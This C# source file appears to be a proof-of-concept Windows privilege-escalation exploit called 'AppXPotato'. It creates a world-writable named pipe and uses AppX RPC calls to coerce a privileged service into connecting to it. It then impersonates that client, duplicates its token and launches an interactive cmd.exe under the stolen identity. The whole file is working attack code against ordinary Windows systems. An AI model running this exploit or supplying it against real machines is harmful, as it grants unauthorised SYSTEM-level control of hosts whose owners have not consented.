using System;
using System.IO;
using System.Text;
using System.IO.Pipes;
using System.Threading;
using System.Diagnostics;
using System.Security.Principal;
using System.Security.AccessControl;
using System.Runtime.InteropServices;
using System.ComponentModel;
using rpc_ae2dc901_312d_41df_8b79_e835e63db874_1_0;
using System.Reflection;


namespace PNAC
{
    class GetSystem
    {
        
        public class NamedPipeServerHelper
        {
            public enum TOKEN_ACCESS : uint
            {
                STANDARD_RIGHTS_REQUIRED = 0x000F0000,
                STANDARD_RIGHTS_READ = 0x00020000,
                TOKEN_ASSIGN_PRIMARY = 0x0001,
                TOKEN_DUPLICATE = 0x0002,
                TOKEN_IMPERSONATE = 0x0004,
                TOKEN_QUERY = 0x0008,
                TOKEN_QUERY_SOURCE = 0x0010,
                TOKEN_ADJUST_PRIVILEGES = 0x0020,
                TOKEN_ADJUST_GROUPS = 0x0040,
                TOKEN_ADJUST_DEFAULT = 0x0080,
                TOKEN_ADJUST_SESSIONID = 0x0100,
                TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY),
                TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
                                    TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
                                    TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
                                    TOKEN_ADJUST_SESSIONID)
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct SECURITY_ATTRIBUTES
            {
                public int nLength;
                public IntPtr lpSecurityDescriptor;
                public int bInheritHandle;
            }

            public enum SECURITY_IMPERSONATION_LEVEL
            {
                SecurityAnonymous,
                SecurityIdentification,
                SecurityImpersonation,
                SecurityDelegation
            }

            public enum TOKEN_TYPE
            {
                TokenPrimary = 1,
                TokenImpersonation
            }

            public enum TOKEN_INFORMATION_CLASS
            {
                TokenUser = 1,
                TokenGroups,
                TokenPrivileges,
                TokenOwner,
                TokenPrimaryGroup,
                TokenDefaultDacl,
                TokenSource,
                TokenType,
                TokenImpersonationLevel,
                TokenStatistics,
                TokenRestrictedSids,
                TokenSessionId,
                TokenGroupsAndPrivileges,
                TokenSessionReference,
                TokenSandBoxInert,
                TokenAuditPolicy,
                TokenOrigin,
                TokenElevationType,
                TokenLinkedToken,
                TokenElevation,
                TokenHasRestrictions,
                TokenAccessInformation,
                TokenVirtualizationAllowed,
                TokenVirtualizationEnabled,
                TokenIntegrityLevel,
                TokenUIAccess,
                TokenMandatoryPolicy,
                TokenLogonSid,
                MaxTokenInfoClass
            }

            [Flags]
            public enum CreateProcessFlags : uint
            {
                CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
                CREATE_DEFAULT_ERROR_MODE = 0x04000000,
                DEBUG_PROCESS = 0x00000001,
                DEBUG_ONLY_THIS_PROCESS = 0x00000002,
                CREATE_SUSPENDED = 0x00000004,
                DETACHED_PROCESS = 0x00000008,
                CREATE_NEW_CONSOLE = 0x00000010,
                NORMAL_PRIORITY_CLASS = 0x00000020,
                CREATE_NEW_PROCESS_GROUP = 0x00000200,
                CREATE_NO_WINDOW = 0x08000000,
                CREATE_PROTECTED_PROCESS = 0x00040000,
                CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
                CREATE_SEPARATE_WOW_VDM = 0x00000800,
                CREATE_SHARED_WOW_VDM = 0x00001000,
                CREATE_UNICODE_ENVIRONMENT = 0x00000400,
                EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
                INHERIT_PARENT_AFFINITY = 0x00010000
            }

            [Flags]
            public enum LogonFlags
            {
                LOGON_WITH_PROFILE = 0x00000001,
                LOGON_NETCREDENTIALS_ONLY = 0x00000002
            }

            [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
            public struct STARTUPINFO
            {
                public Int32 cb;
                public string lpReserved;
                public string lpDesktop;
                public string lpTitle;
                public Int32 dwX;
                public Int32 dwY;
                public Int32 dwXSize;
                public Int32 dwYSize;
                public Int32 dwXCountChars;
                public Int32 dwYCountChars;
                public Int32 dwFillAttribute;
                public Int32 dwFlags;
                public Int16 wShowWindow;
                public Int16 cbReserved2;
                public IntPtr lpReserved2;
                public IntPtr hStdInput;
                public IntPtr hStdOutput;
                public IntPtr hStdError;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct PROCESS_INFORMATION
            {
                public IntPtr hProcess;
                public IntPtr hThread;
                public int dwProcessId;
                public int dwThreadId;
            }

            [DllImport("advapi32.dll", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            public static extern bool ImpersonateNamedPipeClient(
                IntPtr hNamedPipe);

            [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            public static extern bool RevertToSelf();

            [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            public static extern bool CloseHandle(
                IntPtr handle);

            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern IntPtr GetCurrentThread();

            [DllImport("advapi32.dll", SetLastError = true)]
            public static extern bool OpenThreadToken(
                IntPtr ThreadHandle,
                TOKEN_ACCESS DesiredAccess,
                bool OpenAsSelf,
                out IntPtr TokenHandle);

            [DllImport("advapi32.dll", SetLastError = true)]
            public static extern bool SetThreadToken(
                IntPtr pHandle,
                IntPtr hToken);

            [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            public static extern bool DuplicateTokenEx(
                IntPtr hExistingToken,
                TOKEN_ACCESS dwDesiredAccess,
                ref SECURITY_ATTRIBUTES lpTokenAttributes,
                SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
                TOKEN_TYPE TokenType,
                out IntPtr phNewToken);

            [DllImport("Kernel32.dll", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.U4)]
            public static extern UInt32 WTSGetActiveConsoleSessionId();

            [DllImport("advapi32.dll", SetLastError = true)]
            public static extern Boolean SetTokenInformation(
                IntPtr TokenHandle,
                TOKEN_INFORMATION_CLASS TokenInformationClass,
                ref UInt32 TokenInformation,
                UInt32 TokenInformationLength);

            [DllImport("userenv.dll", SetLastError = true)]
            public static extern bool CreateEnvironmentBlock(
                out IntPtr lpEnvironment,
                IntPtr hToken,
                bool bInherit);

            [DllImport("userenv.dll", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            public static extern bool DestroyEnvironmentBlock(
                IntPtr lpEnvironment);

            [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
            public static extern bool CreateProcessWithTokenW(
                IntPtr hToken,
                LogonFlags dwLogonFlags,
                string lpApplicationName,
                string lpCommandLine,
                CreateProcessFlags dwCreationFlags,
                IntPtr lpEnvironment,
                string lpCurrentDirectory,
                [In] ref STARTUPINFO lpStartupInfo,
                out PROCESS_INFORMATION lpProcessInformation);


            public static void AppXInterfaceCall()
            {
                try
                {
                    Console.WriteLine("[!] Calling AppXApplyTrustLabelToFolder_58 (WIN 10 METHOD)");
                    Client client = new Client();
                    client.Connect();
                    string output;
                    client.AppXApplyTrustLabelToFolder_58("\\\\localhost\\\\.\\\\pipe\\PNAC", out output);
                    Console.WriteLine(output);
                }
                catch { }
                try
                {
                    Console.WriteLine("[!] Calling AppXSetTrustLabelOnPackage_59 (WIN 11 METHOD)");
                    Client client = new Client();
                    client.Connect();
                    string output;
                    client.AppXSetTrustLabelOnPackage_59("\\\\localhost\\\\.\\\\pipe\\PNAC", out output);
                    Console.WriteLine(output);
                }
                catch { }
            }

            public static void NamedPipeServer(object data)
            {
                // Create the Pipe
                PipeSecurity ps = new PipeSecurity();
                SecurityIdentifier everyoneSid = new SecurityIdentifier(WellKnownSidType.WorldSid, null);
                string everyone = everyoneSid.Translate(typeof(System.Security.Principal.NTAccount)).ToString();
                Console.WriteLine("[+] Created Malicious named pipe .\\pipe\\PNAC");
                ps.AddAccessRule(new PipeAccessRule(everyone, PipeAccessRights.ReadWrite, AccessControlType.Allow));
                NamedPipeServerStream pipeServer = new NamedPipeServerStream(
                                                    "PNAC",
                                                    PipeDirection.InOut,
                                                    dwThreadCount,
                                                    PipeTransmissionMode.Byte,
                                                    PipeOptions.None,
                                                    1024,
                                                    1024,
                                                    ps);

                IntPtr PipeHandle = pipeServer.SafePipeHandle.DangerousGetHandle();
                if (PipeHandle == IntPtr.Zero)
                {
                    Console.WriteLine("[!] Failed to create outbound Pipe instance.");
                    return;
                }
               
                Console.WriteLine("[!] Initiating AppX RPC coercion");
                AppXInterfaceCall();

                int threadId = Thread.CurrentThread.ManagedThreadId;
                Console.WriteLine("[+] Pipe Client Connected !", threadId);

                // Impersonate
                if (!ImpersonateNamedPipeClient(PipeHandle))
                {
                    Console.WriteLine("[!] Failed to Impersonate client, error: {0}", Marshal.GetLastWin32Error());
                }

                Console.WriteLine("[+] Impersonating Named Pipe Client");

                // Get an impersonation token with the client's security context.
                IntPtr hToken = IntPtr.Zero;
                if (!OpenThreadToken(GetCurrentThread(), TOKEN_ACCESS.TOKEN_ALL_ACCESS, true, out hToken))
                    Console.WriteLine("[!] Failed to get Token, error: {0}", Marshal.GetLastWin32Error());

                Console.WriteLine("[+] Acquired Impersonation Token");

                // Create an Primary token from our impersonation token
                SECURITY_ATTRIBUTES lpSecurityAttributes = new SECURITY_ATTRIBUTES();
                lpSecurityAttributes.nLength = Marshal.SizeOf(lpSecurityAttributes);
                IntPtr hPrimaryToken = IntPtr.Zero;

                bool result = DuplicateTokenEx(
                    hToken,
                    TOKEN_ACCESS.TOKEN_ALL_ACCESS,
                    ref lpSecurityAttributes,
                    SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                    TOKEN_TYPE.TokenPrimary,
                    out hPrimaryToken);

                if (hPrimaryToken == IntPtr.Zero)
                {
                    Console.WriteLine("[*] Failed Duplicating the Token.");
                    return;
                }

                Console.WriteLine("[+] Created Primary Token");

                // Modify token SessionId field to spawn a interactive Processes on the current desktop 
                uint sessionId = WTSGetActiveConsoleSessionId();
                if (!SetTokenInformation(hPrimaryToken,
                        TOKEN_INFORMATION_CLASS.TokenSessionId,
                        ref sessionId,
                        sizeof(UInt32)))
                {
                    Console.WriteLine("[*] Failed to Modify token SessionId.");
                    return;
                }

                // Get all necessary environment variables of logged in user to pass them to the process
                IntPtr lpEnvironment = IntPtr.Zero;
                if (!CreateEnvironmentBlock(out lpEnvironment, hPrimaryToken, true))
                {
                    Console.WriteLine("[*] Failed to create EnvironmentBlock.");
                    return;
                }

                // Start Process with our New token
                PROCESS_INFORMATION processInfo = new PROCESS_INFORMATION();
                STARTUPINFO startupInfo = new STARTUPINFO();
                const int SW_SHOW = 5;
                Console.WriteLine("[!] TANGO DOWN");
                string szCommandLine = "cmd.exe";

                startupInfo.cb = Marshal.SizeOf(startupInfo);
                startupInfo.lpDesktop = "Winsta0\\default";
                startupInfo.wShowWindow = SW_SHOW;

                if (!CreateProcessWithTokenW(
                    hPrimaryToken,
                    LogonFlags.LOGON_WITH_PROFILE,
                    null,
                    szCommandLine,
                    CreateProcessFlags.NORMAL_PRIORITY_CLASS | CreateProcessFlags.CREATE_NEW_CONSOLE | CreateProcessFlags.CREATE_UNICODE_ENVIRONMENT,
                    lpEnvironment,
                    null,
                    ref startupInfo,
                    out processInfo))
                {
                    Console.WriteLine("[!] Failed to Create Process, error: {0}", Marshal.GetLastWin32Error());
                }

                // Destroy Environment Block
                DestroyEnvironmentBlock(lpEnvironment);

                // End impersonation of client
                RevertToSelf();

                //Close Token Handles
                CloseHandle(hPrimaryToken);
                CloseHandle(hToken);

                // Close the pipe (automatically disconnects client too)
                pipeServer.Close();

                return;
            }
        }

        private static int dwThreadCount = 1;

        public static void SystemShell()
        {
            Console.WriteLine("[!] LAUNCHING APPXPOTATO PoC BY PNAC");

            uint i;
            Thread[] pipeServers = new Thread[dwThreadCount];
            for (i = 0; i < dwThreadCount; i++)
            {
                // Create Threads for the Clients
                pipeServers[i] = new Thread(NamedPipeServerHelper.NamedPipeServer);
                pipeServers[i].Start();

                if (pipeServers[i] == null)
                {
                    Console.WriteLine("[!] Create Server Thread failed.");
                    return;
                }
            }

            // Waiting for Threads to finish
            Thread.Sleep(2000);
            while (i > 0)
            {
                for (int j = 0; j < dwThreadCount; j++)
                {
                    if (pipeServers[j] != null)
                    {
                        if (pipeServers[j].Join(2000))
                        {
                            pipeServers[j] = null;
                            i--; // Decrement the Thread Watch Count.
                        }
                    }
                }
            }


            return;
        }
        static void Main(string[] args)
        {
            SystemShell();
        }
    }
}
